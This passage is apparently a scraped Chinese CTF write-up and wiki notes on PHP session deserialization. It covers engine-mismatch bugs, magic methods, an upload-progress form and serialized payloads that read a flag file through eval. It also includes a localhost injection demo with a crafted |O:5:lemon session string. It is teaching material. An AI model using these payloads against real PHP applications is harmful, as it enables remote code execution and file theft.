由于1.php是使用php_serialize引擎处理，因此只会把|当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到|时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对|后的值进行反序列化处理。 这里可能会有一个小疑问，为什么在解析session文件时直接对|后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明： 当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量 因此我们成功触发了test类中的__wakeup()方法,所以这种攻击思路是可行的。但这种方法是在可以对session的进行赋值的，那如果代码中不存在对$_SESSION变量赋值的情况下又该如何利用 $_SESSION变量直接不可控我们来看高校战疫的一道CTF题目 ?php//A webshell is wait for youini_set(session.serialize_handler, php);session_start();class OowoO public $mdzz; function __construct() $this-mdzz = phpinfo();; function __destruct() eval($this-mdzz); if(isset($_GET[phpinfo])) $m = new OowoO();else highlight_string(file_get_contents(index.php));? 我们注意到这样一句话ini_set(session.serialize_handler, php);，因此不难猜测本身在php.ini当中的设置可能是php_serialize，在查看了phpinfo后得证猜测正确，也知道了这道题的考点 那么我们就进入phpinfo查看一下，enabledon表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中 构造文件上传的表单 form action=http://web.jarvisoj.com:32784/index.php method=POST enctype=multipart/form-data input type=hidden name=777 / input type=file name=file / input type=submit //form 接下来构造序列化payload ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(scandir(dirname(__FILE__)));;$obj = new OowoO();echo serialize($obj);? 由于采用Burp发包，为防止双引号被转义，在双引号前加上\\，除此之外还要加上| 在这个页面随便上传一个文件，然后抓包修改filename的值 可以看到Here_1s_7he_fl4g_buT_You_Cannot_see.php这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看 因此我们只需要把payload，当中改为print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));即可获取flag ?phpini_set(session.serialize_handler, php_serialize);session_start();class OowoO public $mdzz=print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));;$obj = new OowoO();echo serialize($obj);? 参考文章https://xz.aliyun.com/t/2715 https://xz.aliyun.com/t/2613 https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf https://blog.csdn.net/qq_43431158articledetails99544797 https://www.cnblogs.com/or4nge/p/13439974.html https://blog.zsxsoft.com/post/38 https://paper.seebug.org/680/ https://www.freebuf.com/articles/web/182231.html https://www.freebuf.com/vuls/202819.html 更新: 2025-09-06 15:37:24原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/5a422f8309de758c4dcb882a6b1e7e79"},{"path":"/wiki/WP/反序列化/php/知识点.html","content":"知识点魔术方法__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发 常规漏洞__WAKEUP将在序列化之后立即被调用,当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。 __DESTRUCTPHP中SESSION反序列化（重点）简介与基础知识在php.ini中存在三项配置项： session.save_path= –设置session的存储路径 session.save_handler= –设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话，默认为0不启动 session.serialize_handler string –定义用来序列化反序列化的处理器名字。默认使用php (php5.5.4) 以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=D:\\xampp\\tmp 表明所有的session文件都是存储在xampptmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列化引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 引擎 session存储方式 php(php5.5.4) 存储方式是，键名+竖线` php_serialize(php5.5.4) 存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化） php_binary 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 在PHP (php5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(session.serialize_handler, 需要设置的引擎名);进行设置。 示例代码如下： php ?phpini_set(session.serialize_handler, php_serialize); //设置序列化引擎使用php_serializesession_start();// do something...... 存储机制 **php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。**存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。假设我们的环境是xampp，那么默认配置如上所述。 在默认配置情况下（在php引擎下：）： php ?phpsession_start() // session_start()会创建新会话或者重用现有会话$_SESSION[name] = spoock;var_dump();? 可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，所以在xampptmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:spoock; 。name是键值，s:6:spoock;是serialize(spoock)的结果（php引擎方式存储：键名+竖线 |+经过serialize()函数序列处理的值）。 在php_serialize引擎下： php ?phpini_set(session.serialize_handler, php_serialize); // 设置序列化引擎使用php_serializesession_start(); // 启动新会话或者重用现有会话 $_SESSION[name] = spoock; var_dump();? SESSION文件的内容是a:1:{s:4:name;s:6:spoock;} 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化。 在php_binary引擎下：存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php ?phpini_set(session.serialize_handler, php_binary);session_start();$_SESSION[name] = spoock;var_dump();? SESSION文件的内容是names:6:spoock; 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据php_binary的存储规则，最后就是names:6:spoock; 。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧) SESSION序列化漏洞利用php ?phpclass syclover var $func=; function __construct() // __construct()在实例化是被调用 $this-func = phpinfo(); function __wakeup() eval($this-func); unserialize($_GET[a]);? 在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问localhost/test.php?a=O:8:syclover:1:{s:4:func;s:14:echo spoock;;} 。那么反序列化得到的内容是： php object(syclover)[1] public func = string echo spoock; (length=14) **最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。**这就是一个简单的序列化的漏洞的演示 PHP SESSION中的序列化危害PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。**如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。**通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如: php $_SESSION[spoock] = |O:11:PeopleClass:0:; 上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是a:1:{s:6:spoock;s:24:|O:11:PeopleClass:0:{};} 。 但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是： php array (size=1) a:1:s:6:spoock;s:24: = object(__PHP_Incomplete_Class)[1] public __PHP_Incomplete_Class_Name = string PeopleClass (length=11) 这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。 s1.php，使用php_serialize来处理session php ?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[spoock]=$_GET[a]; us2.php，使用php来处理session php ini_set(session.serialize_handler, php);`localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;`session_start();class lemon var $hi; function __construct() $this-hi = phpinfo();; function __destruct() eval($this-hi); // O:5:lemon:1:s:2:hi;s:14:echo spoock;; 此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中ini_set(session.serialize_handler, php);，选择session序列化处理器。 当访问s1.php时，提交如下的数据并存储到session文件中： php localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;1 此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。 O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |就行了 php ?phpclass lemon public $hi=xxxxx;$obj = new lemon();echo serialize($obj);?xxxxx处按照你想执行的代码来填写，这里填的是echo spoock 此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。 更新: 2025-09-06 15:37:27原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/079188fb1024e58dee81f68238bfbf36"}]